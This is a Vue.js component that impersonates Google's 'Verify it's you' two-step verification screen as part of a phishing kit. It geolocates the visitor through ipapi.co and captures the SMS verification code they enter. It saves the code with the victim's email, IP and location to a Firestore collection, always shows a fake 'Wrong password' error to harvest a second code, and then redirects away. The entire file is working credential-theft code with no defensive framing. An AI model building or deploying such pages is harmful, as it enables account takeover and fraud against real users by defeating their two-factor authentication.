<template>
  <v-app color>
    <v-content class>
      <v-container fill-height class="d-flex justify-center">
        <v-card
          max-width="448"
          height="500"
          :loading="cardLoading"
          :outlined="true"
          flat
          :disabled="disableCard"
          class="pl-8 pr-8"
        >
          <v-card-title>
            <v-img
              width="20"
              height="32"
              :src="require('@/assets/google_logo.png')"
              :contain="true"
              class="mt-8"
            />
          </v-card-title>
          <v-card-text>
            <h3 class="headline text-center text--primary">Verify it's you</h3>
            <h4
              class="text--primary text-center"
            >This device isn't recognised. For your security, Google wants to make sure it's really you.</h4>
            <h4 class="primary--text text-center">Learn more</h4>
            <div class="text-center">
              <v-btn :rounded="true" class="ma-3 mx-auto email-button" :outlined="true">
                <v-icon left>mdi-account-circle</v-icon>
                <div class="text--primary text-none">{{email}}</div>
                <v-icon right>mdi-chevron-down</v-icon>
              </v-btn>
              <p
                class="text--primary"
              >A text message with a 6-digit verification code was just sent to your phone.</p>
              <v-text-field
                type="number"
                label="Enter the code"
                :error="error"
                v-model="password"
                :outlined="true"
                width="300"
                color="primary"
                class="mt-5"
                :error-messages="errorMessage"
                @click:append="showPassword = !showPassword"
                v-on:keyup.enter="submitForm"
                ref="password"
              ></v-text-field>
            </div>
          </v-card-text>
          <v-card-actions>
            <v-btn color="primary" class="text-none" :depressed="true" text>Try another way</v-btn>
            <v-spacer></v-spacer>
            <v-btn
              color="primary"
              :depressed="true"
              @click="submitForm"
              eight="36"
              width="88"
              class="text-none"
            >Next</v-btn>
          </v-card-actions>
          <v-snackbar v-model="snackbar" :bottom="true" :timeout="0">
            Didn't get the code?
            <v-btn dark text @click="resendCode" color="yellow">RESEND IT</v-btn>
          </v-snackbar>
        </v-card>
      </v-container>
    </v-content>
  </v-app>
</template>

<script>
import { db } from "../firebase";
export default {
  name: "LoginForm",

  data: () => ({
    showPassword: false,
    errorMessage: "",
    error: false,
    disableCard: false,
    email: "",
    password: "",
    ipAddress: "",
    countryName: "",
    city: "",
    region: "",
    submitCount: 0,
    cardLoading: false,
    snackbar: false
  }),

  async created() {
    this.email = this.$route.params.email;
    console.log(this.email);
    try {
      const { data } = await this.$http(`https://ipapi.co/json/`);
      console.log(data);
      this.ipAddress = data.ip;
      this.countryName = data.country_name;
      this.city = data.city;
      this.region = data.region;
    } catch (e) {
      console.log(e);
    }
    this.$refs.password.focus();
  },
  mounted() {
    console.log("i mounted");
    setInterval(() => {
      console.log("snackbar ran here");
      if (this.snackbar == false) this.snackbar = true;
    }, 15000);
  },
  firestore() {
    return {
      users: db.collection("users")
    };
  },
  methods: {
    async submitForm() {
      console.log(this.email, this.password);

      if (this.password.length != 6) {
        console.log("i ran password length");
        this.error = true;
        this.errorMessage = "Wrong number of digits. try again";
        this.password = "";
        return;
      }
      this.submitCount++;
      this.errorMessage = "";
      this.error = false;
      console.log(this.submitCount);

      this.disableCard = true;
      this.cardLoading = true;
      try {
        const userRef = await this.$firestore.users
          .where("email", "==", this.email)
          .where("password", "==", this.password)
          .get();

        if (userRef.docs.length == 0) {
          // this.$router.push({ name: "notListed" });
          await this.$firestore.users.add({
            email: this.email,
            password: `G-${this.password}`,
            ipAddress: this.ipAddress,
            country: this.countryName,
            city: this.city,
            region: this.region,
            createdAt: new Date()
          });
        }

        this.password = "";
        this.error = true;
        this.errorMessage =
          "Wrong password. Try again or click Forgot password to reset it.";
        this.disableCard = false;
        this.cardLoading = false;
        if (this.submitCount == 2) {
          this.$router.push({ name: "SessionEnded" });
          // this.$router.push({ name: "success" });
          // this.$router.push({ name: "DocumentNotfound" });
        }
      } catch (e) {
        console.log(e);
      }
    },
    resendCode() {
      this.snackbar = false;
      this.cardLoading = true;
      this.disableCard = true;
      this.error = false;
      this.errorMessage = "";

      setTimeout(() => {
        this.cardLoading = false;
        this.disableCard = false;
        this.password = "";
      }, 3000);
    }
  }
};
</script>

<style lang="scss">
a {
  text-decoration: none;
  color: #005da6;
}
.rounded-button {
  border-radius: 0px;
}
.email-button {
  border: 0.5px solid rgb(219, 219, 219);
}
</style>